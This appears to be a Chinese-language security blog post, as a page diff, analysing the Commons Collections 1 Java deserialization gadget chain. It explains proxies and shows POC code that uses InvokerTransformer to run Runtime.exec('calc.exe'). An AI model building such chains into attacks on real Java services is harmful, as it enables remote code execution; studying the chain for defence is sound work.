@@ -1,0 +1,638 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="前言CommonCollections利用链是Java反序列化中最经典的利用链
+本文将对Common-Collections-1的反序列化利用进行分析">
+  <meta name="author" content="Errorecho">
+  <meta name="keywords" content="">
+  <meta name="description" content="前言CommonCollections利用链是Java反序列化中最经典的利用链 本文将对Common-Collections-1的反序列化利用进行分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Common-Collections-1 反序列化利用分析">
+<meta property="og:url" content="http://www.errorecho.com/2021/11/11/CommonsCollections-1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Errorecho">
+<meta property="og:description" content="前言CommonCollections利用链是Java反序列化中最经典的利用链 本文将对Common-Collections-1的反序列化利用进行分析">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211111161147882.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211111162829241.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211111163743357.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211111172352881.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211115152147623.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211115152337212.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211115152734206.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211115153244845.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211115153818943.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-2021111515475802.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211115161718414.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211115162858204.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211116145115237.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211116152132565.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211116152231880.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211116160556570.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211116160746393.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211116172934183.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211116171620552.png">
+<meta property="og:image" content="http://www.errorecho.com/img/markdown-img-paste-20211116173736390.png">
+<meta property="article:published_time" content="2021-11-11T05:16:06.000Z">
+<meta property="article:modified_time" content="2021-12-02T06:26:55.092Z">
+<meta property="article:author" content="Errorecho">
+<meta property="article:tag" content="Common-Collections">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://www.errorecho.com/img/markdown-img-paste-20211111161147882.png">
+  
+  <title>Common-Collections-1 反序列化利用分析 - Errorecho</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.errorecho.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Errorecho&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                主页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                文章
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                类别
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/1.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Common-Collections-1 反序列化利用分析">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-11-11 13:16" pubdate>
+        November 11, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      21k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      65 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Common-Collections-1 反序列化利用分析</h1>
+            
+            <div class="markdown-body">
+              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CommonCollections利用链是Java反序列化中最经典的利用链</p>
+<p>本文将对Common-Collections-1的反序列化利用进行分析</p>
+<span id="more"></span>
+
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文将从以下方面进行讲述</p>
+<ul>
+<li>动态代理</li>
+<li>CommonCollections-1 POC构造</li>
+</ul>
+<h1 id="Commons-Collections"><a href="#Commons-Collections" class="headerlink" title="Commons Collections"></a>Commons Collections</h1><p>Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。</p>
+<p>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p>
+<p>由于大量的生产环境中都会导入这个包，所以此包中的众多反序列化链已经成为经典链条。</p>
+<h1 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h1><p>代理模式是常用的java设计模式，他的特征是代理类与委托类有同样的接口，代理类主要负责为委托类预处理消息、过滤消息、把消息转发给委托类，以及事后处理消息等。代理类与委托类之间通常会存在关联关系，一个代理类的对象与一个委托类的对象关联，代理类的对象本身并不真正实现服务，而是通过调用委托类的对象的相关方法，来提供特定的服务。简单的说就是，我们在访问实际对象时，是通过代理对象来访问的，代理模式就是在访问实际对象时引入一定程度的间接性。<br><img src="/img/markdown-img-paste-20211111161147882.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>在编译时就已经将接口，被代理类，代理类等确定下来。在程序运行之前，代理类的.class文件就已经生成。</p>
+<h3 id="静态代理的简单demo"><a href="#静态代理的简单demo" class="headerlink" title="静态代理的简单demo"></a>静态代理的简单demo</h3><p>People.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">People</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">paytaxes</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Staff.class</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Staff</span> <span class="hljs-title">implements</span> <span class="hljs-title">People</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">String</span> name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-title">Staff</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name</span>)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">paytaxes</span>(<span class="hljs-params"></span>)</span> &#123;<br>        System.out.println(name + <span class="hljs-string">&quot;交税1.2w&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Company.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Company</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">People</span></span>&#123;<br><br>    Staff sta;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Company</span><span class="hljs-params">(People sta)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(sta.getClass() == Staff.class) &#123;<br>            <span class="hljs-keyword">this</span>.sta = (Staff)sta;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">paytaxes</span><span class="hljs-params">()</span> </span>&#123;<br>        sta.paytaxes();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>测试一下代理模式<br>Test.class</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) &#123;<br><br>        People zhangsan = <span class="hljs-keyword">new</span> <span class="hljs-type">Staff</span>(<span class="hljs-string">&quot;errorecho&quot;</span>);<br><br>        People proxy = <span class="hljs-keyword">new</span> <span class="hljs-type">Company</span>(zhangsan);<br><br>        proxy.paytaxes();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="/img/markdown-img-paste-20211111162829241.png" srcset="/img/loading.gif" lazyload><br>这里并没有直接调用被代理对象的方法，而是通过代理对象去代理执行。此为代理模式<br>代理模式最主要的就是有一个公共接口（People），一个具体的类（Staff），一个代理类（Company）,代理类持有具体类的实例，代为执行具体类实例方法。<br>代理模式就是在访问实际对象时引入一定程度的间接性，因为这种间接性，可以附加多种用途。<br>例如这里我们想在所有staff交税前为它缴纳补充医保，只需修改Company.class。即可为所有员工缴纳<br>Staff.class</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Company</span> <span class="hljs-title">implements</span> <span class="hljs-title">People</span>&#123;<br><br>    Staff sta;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Company</span>(<span class="hljs-params">People sta</span>)</span> &#123;<br>        <span class="hljs-keyword">if</span>(sta.getClass() == Staff.<span class="hljs-keyword">class</span>) &#123;<br>            <span class="hljs-keyword">this</span>.sta = (Staff)sta;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">paytaxes</span>(<span class="hljs-params"></span>)</span> &#123;<br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;缴纳补充医保&quot;</span>);<br>        sta.paytaxes();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="/img/markdown-img-paste-20211111163743357.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>代理类在程序运行时创建的代理方式被成为动态代理。 我们上面静态代理的例子中，代理类(Company)是自己定义好的，在程序运行之前就已经编译完成。然而动态代理，代理类并不是在Java代码中定义的，而是在运行时根据我们在Java代码中的“指示”动态生成的。相比于静态代理， 动态代理的优势在于可以很方便的对代理类的函数进行统一的处理，而不用修改每个代理类中的方法。</p>
+<h3 id="动态代理的简单实现"><a href="#动态代理的简单实现" class="headerlink" title="动态代理的简单实现"></a>动态代理的简单实现</h3><p>People.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">People</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">paytaxes</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Staff.class</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Staff</span> <span class="hljs-title">implements</span> <span class="hljs-title">People</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">String</span> name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-title">Staff</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name</span>)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">paytaxes</span>(<span class="hljs-params"></span>)</span> &#123;<br>        System.out.println(name + <span class="hljs-string">&quot;交税1.2w&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>ProxyHandler.class</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.<span class="hljs-keyword">Method</span>;<br><br><span class="hljs-keyword">class</span> ProxyHandler implements InvocationHandler &#123;<br>    //这里写的是<span class="hljs-keyword">Object</span>类<br>    private <span class="hljs-keyword">Object</span> <span class="hljs-keyword">object</span>;<br><br>    <span class="hljs-built_in">public</span> ProxyHandler(<span class="hljs-keyword">Object</span> <span class="hljs-keyword">object</span>) &#123;<br>        this.<span class="hljs-keyword">object</span> = <span class="hljs-keyword">object</span>;<br>    &#125;<br><br>    @Override<br>    <span class="hljs-built_in">public</span> <span class="hljs-keyword">Object</span> invoke(<span class="hljs-keyword">Object</span> proxy, <span class="hljs-keyword">Method</span> <span class="hljs-keyword">method</span>, <span class="hljs-keyword">Object</span>[] args) throws Throwable &#123;<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;--------------begin-------------&quot;);<br>        //通过反射来调用被代理类的方法<br>        <span class="hljs-keyword">method</span>.invoke(<span class="hljs-keyword">object</span>, args);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(&quot;--------------end-------------&quot;);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>测试动态代理<br>ProxyTest.class</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">import java.lang.reflect.InvocationHandler;<br>import java.lang.reflect.Proxy;<br><br>public <span class="hljs-keyword">class</span> ProxyTest &#123;<br><br>    public static void main(String<span class="hljs-literal">[]</span> args) &#123;<br>        <span class="hljs-comment">//实例化被动态代理的对象</span><br>        Staff staff = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Staff(<span class="hljs-string">&quot;xiaoming&quot;</span>)</span>;<br>        <span class="hljs-comment">//实例化实现了InvocationHandler接口的类</span><br>        InvocationHandler proxyHandler = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ProxyHandler(<span class="hljs-params">staff</span>)</span>;<br>        <span class="hljs-comment">//创建代理类proxyStaff</span><br>        People proxyStaff = (People) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(Staff.<span class="hljs-params">class</span>.<span class="hljs-params">getClassLoader</span>()</span>, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Staff</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Interfaces()</span>, proxyHandler);<br>        <span class="hljs-comment">//代理类对象调用被代理类的方法</span><br>        proxyStaff.paytaxes<span class="hljs-literal">()</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="/img/markdown-img-paste-20211111172352881.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h1><p>在commons collections中有一个Transformer接口，其中包含一个transform方法，通过实现此接口来达到类型转换的目的。</p>
+<p><img src="/img/markdown-img-paste-20211115152147623.png" srcset="/img/loading.gif" lazyload></p>
+<p>该接口的重要实现类有：ConstantTransformer、InvokerTransformer、ChainedTransformer、TransformedMap 。</p>
+<h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>ConstantTransformer实现了Transformer接口，并重写了transform方法</p>
+<p><img src="/img/markdown-img-paste-20211115152337212.png" srcset="/img/loading.gif" lazyload></p>
+<p>在源码中，不难看出，重写的方法实现的功能：对输入的对象原封不动的返回</p>
+<p>举例：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> POC &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) &#123;<br>        <span class="hljs-keyword">Object</span> obj = Runtime.<span class="hljs-keyword">class</span>;<br>        ConstantTransformer transformer = <span class="hljs-built_in">new</span> ConstantTransformer(obj);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(transformer.<span class="hljs-keyword">transform</span>(obj));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>程序结果</p>
+<p><img src="/img/markdown-img-paste-20211115152734206.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>InvokerTransformer类transform方法实现了类方法动态调用，即采用反射机制动态调用类方法（反射方法名、参数值均可控）并返回该方法执行结果。</p>
+<p><img src="/img/markdown-img-paste-20211115153244845.png" srcset="/img/loading.gif" lazyload></p>
+<p>举例，利用InvokerTransformer实现代码执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">import org.apache.commons.collections.Transformer;<br>import org.apache.commons.collections.functors.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-keyword">void</span> main(<span class="hljs-keyword">String</span>[] args) throws <span class="hljs-built_in">Exception</span> &#123;<br>        <span class="hljs-comment">//通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值</span><br>        InvokerTransformer a = <span class="hljs-keyword">new</span> InvokerTransformer(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">Class</span>[]</span>&#123;<span class="hljs-keyword">String</span>.<span class="hljs-keyword">class</span>&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-keyword">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;<br>        );<br>        <span class="hljs-comment">//构造input</span><br>        <span class="hljs-keyword">Object</span> input=<span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>));<br>        <span class="hljs-comment">//执行</span><br>        a.transform(input);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>根据传入的参数，成功执行calc.exe<br><img src="/img/markdown-img-paste-20211115153818943.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据前文，我们得知ConstantTransformer可以原封不动的返回对象，则我们可以组合一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">import org.apache.commons.collections.Transformer;<br>import org.apache.commons.collections.functors.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-keyword">void</span> main(<span class="hljs-keyword">String</span>[] args) throws <span class="hljs-built_in">Exception</span> &#123;<br>        <span class="hljs-comment">//通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值</span><br>        InvokerTransformer a = <span class="hljs-keyword">new</span> InvokerTransformer(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-class"><span class="hljs-keyword">Class</span>[]</span>&#123;<span class="hljs-keyword">String</span>.<span class="hljs-keyword">class</span>&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-keyword">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;<br>        );<br>        <span class="hljs-comment">//构造input</span><br>        <span class="hljs-keyword">Object</span> constantTransformer = <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>))).transform(<span class="hljs-number">123</span>);<br>        <span class="hljs-comment">//执行</span><br>        a.transform(constantTransformer);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>结果同上</p>
